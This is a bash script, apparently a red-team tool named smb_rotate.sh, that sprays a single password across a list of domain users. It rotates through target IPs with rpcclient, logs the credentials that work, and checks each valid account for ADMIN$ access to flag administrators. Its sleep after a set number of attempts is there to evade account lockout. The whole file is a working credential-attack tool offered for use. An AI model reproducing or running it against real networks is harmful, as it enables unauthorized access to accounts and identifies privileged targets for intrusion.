#!/bin/bash
# Author: Gustavo Segundo - ByteNull%00

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

export DEBIAN_FRONTEND=noninteractive

	cat <<-'EOF'


███████╗███╗   ███╗██████╗         ██████╗  ██████╗ ████████╗ █████╗ ████████╗███████╗
██╔════╝████╗ ████║██╔══██╗        ██╔══██╗██╔═══██╗╚══██╔══╝██╔══██╗╚══██╔══╝██╔════╝
███████╗██╔████╔██║██████╔╝        ██████╔╝██║   ██║   ██║   ███████║   ██║   █████╗  
╚════██║██║╚██╔╝██║██╔══██╗        ██╔══██╗██║   ██║   ██║   ██╔══██║   ██║   ██╔══╝  
███████║██║ ╚═╝ ██║██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║   ██║   ███████╗
╚══════╝╚═╝     ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝
                                                        		v1.0 codead by ByteNull%00
                                                     		        Gustavo Segundo | gasso2do@gmail.com 


	EOF

declare -i counter=0
declare -i counter2=0

IP_FILE="$1"
DOMAIN="$2"
USER_FILE="$3"
PASS="$4"
ATTEMPTS_BEFORE_SLEEP="$5"
SLEEP="$6"

TMP_FILE="/tmp/tmp_smb.$$.tmp"
TMP_FILE_RESULTS="/tmp/tmp_smb_results.$$.tmp"

trap ctrl_c INT

function ctrl_c(){
	echo -e "\n${yellowColour}[*]${endColour} Exit ..."
	exit 1
}

help(){
        echo "Usage: ./smb_rotate.sh <IP_FILE> <DOMAIN> <USER_FILE> <PASSWORD> <NUMBER OF ATTEMPTS BEFORE SLEEP> <SLEEP SECONDS>"
}

if [ -z "$IP_FILE" ]; then
        echo "Error: Provide me with a ip file"
        help
        exit 1
fi

if [ -z "$DOMAIN" ]; then
        echo "Error: Provide me with a domain"
        help
        exit 2
fi

if [ -z "$USER_FILE" ]; then
        echo "Error: Provide me with a users file"
        help
        exit 3
fi

if [ -z "$PASS" ]; then
        echo "Error: Provide me with a password"
        help
        exit 4
fi

if [ -z "$ATTEMPTS_BEFORE_SLEEP" ]; then
        echo "Error: Provide me with a number of attempts before sleeping"
        help
        exit 5
fi

if [ -z "$SLEEP" ]; then
        echo "Error: Provide me with a number of seconds to sleep"
        help
        exit 6
fi


filecontent=( `cat $USER_FILE `)
fileips=( `cat $IP_FILE `)
touch $TMP_FILE_RESULTS
for user in "${filecontent[@]}"; do

	rpcclient -U "${DOMAIN}\\${user}%${PASS}" ${fileips[$counter2]} -c 'getusername' > $TMP_FILE

		if [ "Account Name" == "$(cat $TMP_FILE | grep -io 'Account Name')" ]; then

			echo -e "${blueColour}SMB${endColour}\t\t ${fileips[$counter2]}\t 445\t\t ${greenColour}[+]${endColour} ${DOMAIN}\\${user}:${PASS}"
			echo -e "${greenColour}[+]${endColour} ${DOMAIN}\\${user}:${PASS}" >> $TMP_FILE_RESULTS

			rpcclient -U "${DOMAIN}\\${user}%${PASS}" ${fileips[$counter2]} -c "netsharegetinfo 'ADMIN\$" > $TMP_FILE

			if [ "netname" == "$(cat $TMP_FILE | grep -io 'netname')" ]; then

				echo -e "${blueColour}SMB${endColour}\t\t ${fileips[$counter2]}\t 445\t\t ${greenColour}[+]${endColour} ${DOMAIN}\\${user}:${PASS} ${yellowColour}(Administrator!)${endColour}"
				echo -e "${greenColour}[+]${endColour} ${DOMAIN}\\${user}:${PASS} ${yellowColour}(Administrator!)${endColour}" >> $TMP_FILE_RESULTS
			fi	
		else	
			echo -e "${blueColour}SMB${endColour}\t\t ${fileips[$counter2]}\t 445\t\t ${redColour}[-]${endColour} ${DOMAIN}\\${user}:${PASS}"
		fi

	counter=$((counter+1))

	counter2=$((counter2+1))

	if [ $counter -eq $ATTEMPTS_BEFORE_SLEEP ] ;then
		echo -e "\n${blueColour}[*]${endColour} Sleep ${SLEEP} seconds ... \n"
		counter=0
		sleep $SLEEP
	fi

	if [ $counter2 -eq ${#fileips[@]} ] ;then
		counter2=0
	fi
done

echo -e "\n${purpleColour}[*]${endColour} Found valid domain accounts ... \n"
cat $TMP_FILE_RESULTS

rm -rf $TMP_FILE
rm -rf $TMP_FILE_RESULTS
